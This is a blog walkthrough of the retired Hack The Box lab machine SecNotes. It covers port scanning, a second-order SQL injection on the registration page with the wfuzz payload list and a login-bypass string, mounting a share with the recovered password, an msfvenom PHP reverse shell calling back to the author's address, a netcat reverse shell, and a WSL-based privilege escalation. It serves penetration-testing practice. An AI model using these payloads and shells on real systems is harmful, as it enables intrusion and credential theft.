---
layout: post
title: "SecNotes: Hack The Box Walkthrough"
date: 2019-01-20 05:28:34 +0000
last_modified_at: 2019-01-20 05:32:20 +0000
category: Walkthrough
tags: ["Hack The Box", SecNotes, retired]
comments: true
image:
  feature: secnotes-htb-walkthrough.jpg
  credit: Pexels / Pixabay
  creditlink: https://pixabay.com/en/post-it-notes-sticky-notes-note-1284667/
---

This post documents the complete walkthrough of SecNotes, a retired vulnerable [VM][1] created by [0xdf][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

SecNotes is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-19 03:49:54 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 445/tcp on 10.10.10.97                                    
Discovered open port 80/tcp on 10.10.10.97                                     
Discovered open port 8808/tcp on 10.10.10.97
```

I'll do one better with `nmap` scanning the discovered open ports.

```
# nmap -n -v -Pn -p80,445,8808 -A --reason -oN nmap.txt 10.10.10.97
...
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
...
Host script results:
|_clock-skew: mean: 2h40m01s, deviation: 4h37m09s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2019-01-18T19:53:32-08:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-01-19 03:53:30
|_  start_date: N/A
```

It's a Windows box alright. But, let's go with the `http` services: `80/tcp` and `8808/tcp`. This is how they look like.

<a class="image-popup">
![fd6bd2e1.png](/assets/images/posts/secnotes-htb-walkthrough/fd6bd2e1.png)
</a>

<a class="image-popup">
![ae7f7c8e.png](/assets/images/posts/secnotes-htb-walkthrough/ae7f7c8e.png)
</a>

Notice the login page allows new sign up? Let's go ahead and open Burp, and sign up a `dick` user for ourselves.

<a class="image-popup">
![6a4036f5.png](/assets/images/posts/secnotes-htb-walkthrough/6a4036f5.png)
</a>

Login time.

<a class="image-popup">
![c91382bf.png](/assets/images/posts/secnotes-htb-walkthrough/c91382bf.png)
</a>

It's obvious that user `tyler` is present in the system. If we re-login with `tyler`, this is what happens.

<a class="image-popup">
![b6096c25.png](/assets/images/posts/secnotes-htb-walkthrough/b6096c25.png)
</a>

### 2nd-order SQL Injection

Hmm. Let's use `wfuzz` to inject common SQL injection strings into the registration page just to see what we get. Here, I'm soliciting `200` responses to see what's going on with the registration. Typically, a successful registration will return a `302` response.

```
# wfuzz -w /usr/share/wfuzz/wordlist/Injections/SQL.txt -t 20 --sc 200 -d "username=dickFUZZ&password=password&confirm_password=password" http://10.10.10.97/register.php

********************************************************
* Wfuzz 2.3.3 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.97/register.php
Total requests: 125

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000083:  C=200     40 L      116 W         1689 Ch        "t'exec master..xp_cmdshell 'nslookup www.google.com'--"
000096:  C=200     40 L      115 W         1643 Ch        "%27%20or%201=1"
000100:  C=200     40 L      110 W         1625 Ch        "&apos;%20OR"
000105:  C=200     40 L      113 W         1637 Ch        "*|"
000104:  C=200     40 L      113 W         1636 Ch        "%7C"
000107:  C=200     40 L      113 W         1647 Ch        "*(|(mail=*))"
000109:  C=200     40 L      113 W         1654 Ch        "*(|(objectclass=*))"
000113:  C=200     40 L      113 W         1636 Ch        ")"
000115:  C=200     40 L      110 W         1625 Ch        "&"
000112:  C=200     40 L      113 W         1636 Ch        "%28"
000119:  C=200     40 L      110 W         1625 Ch        "' or 1=1 or ''='"
000117:  C=200     40 L      113 W         1636 Ch        "!"
000120:  C=200     40 L      110 W         1625 Ch        "' or ''='"

Total time: 24.13528
Processed Requests: 125
Filtered Requests: 112
Requests/sec.: 5.179139
```

Long story short, I tried all the payloads and `' or 1=1 or ''='` manage bypass the login and display the following notes. :triumph:

<a class="image-popup">
![ad70d8fa.png](/assets/images/posts/secnotes-htb-walkthrough/ad70d8fa.png)
</a>

It's the credentials that's interesting!

<a class="image-popup">
![4171ae04.png](/assets/images/posts/secnotes-htb-walkthrough/4171ae04.png)
</a>

Armed with this new information, we can mount the file share.

### New Site

We can mount the file share with `mount` of course.

```
# mount -t cifs -o username=tyler,password='92g!mA8BGjOirkL%OG*&',uid=0,gid=0 //10.10.10.97/new-site /mnt/secnotes/new-site
```

What do we have here?

<a class="image-popup">
![2a831a0b.png](/assets/images/posts/secnotes-htb-walkthrough/2a831a0b.png)
</a>

Appears to be the `wwwroot` of the other `http` service: `8808/tcp`. And since the site is running PHP, let's copy a reverse shell written in PHP over to the new site. We can generate the reverse shell with `msfvenom` like so.

```
# msfvenom -p php/reverse_php LHOST=10.10.12.9 LPORT=1234 -o rev.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3004 bytes
Saved as: rev.php
```

Visit http://10.10.10.97:8808/rev.php.

<a class="image-popup">
![df14467b.png](/assets/images/posts/secnotes-htb-walkthrough/df14467b.png)
</a>

Meanwhile at my `nc` listener...

<a class="image-popup">
![be9c59ae.png](/assets/images/posts/secnotes-htb-walkthrough/be9c59ae.png)
</a>

Awesome, but the reverse shell is pretty unstable. We need a resilient shell to conduct further enumeration.

Let's transfer a `nc` for Windows over. If you are using Kali Linux, it's at `/usr/share/windows-binaries/nc.exe`.

Now, once the PHP reverse shell connects back, launch `nc.exe` to connect back to me at a different port, say `4321/tcp`.

<a class="image-popup">
![8b9c4675.png](/assets/images/posts/secnotes-htb-walkthrough/8b9c4675.png)
</a>

<a class="image-popup">
![0e7bd373.png](/assets/images/posts/secnotes-htb-walkthrough/0e7bd373.png)
</a>

`user.txt` is at `tyler`'s desktop.

<a class="image-popup">
![4a6d69c3.png](/assets/images/posts/secnotes-htb-walkthrough/4a6d69c3.png)
</a>

## Privilege Escalation

During enumeration of `tyler`'s account, I notice a shortcut (LNK) pointing to `bash.exe` at the Windows System32 directory.

<a class="image-popup">
![357d9fe1.png](/assets/images/posts/secnotes-htb-walkthrough/357d9fe1.png)
</a>

Furthermore, `\Distros\Ubuntu\ubuntu.exe` is present too.

<a class="image-popup">
![9d69985b.png](/assets/images/posts/secnotes-htb-walkthrough/9d69985b.png)
</a>

This led me to believe Windows Subsystem for Linux (WSL) is installed. Perhaps `bash.exe` is around somewhere as well?

<a class="image-popup">
![ba9df166.png](/assets/images/posts/secnotes-htb-walkthrough/ba9df166.png)
</a>

Sweet. Let's copy that to `tyler`'s desktop and launch `bash.exe -i`.

<a class="image-popup">
![8c22458c.png](/assets/images/posts/secnotes-htb-walkthrough/8c22458c.png)
</a>

What do you know? I'm `root`! Man, I'm like a duck to water in the Linux environment.

<a class="image-popup">
![a76d0199.png](/assets/images/posts/secnotes-htb-walkthrough/a76d0199.png)
</a>

Armed with the administrator password, we can now mount the C$ volume and access `root.txt`.

<a class="image-popup">
![26458f3a.png](/assets/images/posts/secnotes-htb-walkthrough/26458f3a.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/151
[2]: https://www.hackthebox.eu/home/users/profile/4935
[3]: https://www.hackthebox.eu/
